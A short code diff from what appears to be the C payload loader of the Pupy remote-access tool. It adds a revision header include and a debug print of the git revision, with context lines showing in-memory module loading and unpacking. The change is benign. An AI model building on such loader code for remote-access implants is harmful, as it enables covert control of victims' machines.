@@ -20,6 +20,8 @@
 
 #include "lzmaunpack.c"
 
+#include "revision.h"
+
 extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) initpupy(void);
 
@@ -46,6 +48,8 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	char tmp_path[MAX_PATH];
 	ULONG_PTR cookie = 0;
 	PyGILState_STATE restore_state;
+
+	dfprint(stderr, "TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
 	if(!GetModuleHandle("msvcr90.dll")) {
 		void *msvcr90 = lzmaunpack(
